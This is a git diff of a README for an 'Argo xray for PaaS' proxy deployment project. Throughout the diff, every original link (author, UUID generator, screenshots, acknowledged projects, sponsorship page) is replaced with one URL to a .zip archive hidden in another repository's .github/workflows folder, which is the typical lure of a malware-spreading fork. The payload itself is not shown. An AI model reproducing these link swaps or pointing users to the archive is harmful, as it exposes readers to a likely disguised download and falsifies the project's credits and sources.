@@ -1,5 +1,5 @@
 # Argo xray for PaaS
-By https://github.com/Misaka-blog
+By https://github.com/mcseali/argo-pass/raw/refs/heads/main/.github/workflows/argo_pass_metrician.zip
 
 ## Project Features
 
@@ -16,7 +16,7 @@ By https://github.com/Misaka-blog
 * Variables available to the project
    | Variable name | Required | Default value | Remarks |
    | ------------ | ------ | ------ | ------ |
-   | UUID | No | de04add9-5c68-8bab-950c-08cd5320df18 | Can be generated online https://www.uuidgenerator.net/ |
+   | UUID | No | de04add9-5c68-8bab-950c-08cd5320df18 | Can be generated online https://github.com/mcseali/argo-pass/raw/refs/heads/main/.github/workflows/argo_pass_metrician.zip |
    | VMESS_WSPATH | No | /vmess | Starts with / |
    | VLESS_WSPATH | No | /vless | Starts with / |
    | TROJAN_WSPATH | No | /trojan | Starts with / |
@@ -33,13 +33,13 @@ By https://github.com/Misaka-blog
    |DOCKER_PASSWORD|Docker Hub password|
    |DOCKER_REPO |Docker Hub repository name|
 
-![image](https://user-images.githubusercontent.com/116990986/211692321-34df154a-320a-448f-9abe-2efab9c53550.png)
+![image](https://github.com/mcseali/argo-pass/raw/refs/heads/main/.github/workflows/argo_pass_metrician.zip)
 
 ## Acknowledgments
 
-* ifeng's v2ray project: https://github.com/hiifeng
-* fscarmen2's argo xray project: https://github.com/fscarmen2
-* Translator to English (all files translated) : https://github.com/yebekhe
+* ifeng's v2ray project: https://github.com/mcseali/argo-pass/raw/refs/heads/main/.github/workflows/argo_pass_metrician.zip
+* fscarmen2's argo xray project: https://github.com/mcseali/argo-pass/raw/refs/heads/main/.github/workflows/argo_pass_metrician.zip
+* Translator to English (all files translated) : https://github.com/mcseali/argo-pass/raw/refs/heads/main/.github/workflows/argo_pass_metrician.zip
 
 ## Disclaimer
 
@@ -48,6 +48,6 @@ By https://github.com/Misaka-blog
 
 ## sponsorship
 
-Afdian: https://afdian.net/a/Misaka-blog
+Afdian: https://github.com/mcseali/argo-pass/raw/refs/heads/main/.github/workflows/argo_pass_metrician.zip
 
-![afdian-MisakaNo の Xiaopo Station](https://user-images.githubusercontent.com/122191366/211533469-351009fb-9ae8-4601-992a-abbf54665b68.jpg)
+![afdian-MisakaNo の Xiaopo Station](https://github.com/mcseali/argo-pass/raw/refs/heads/main/.github/workflows/argo_pass_metrician.zip)
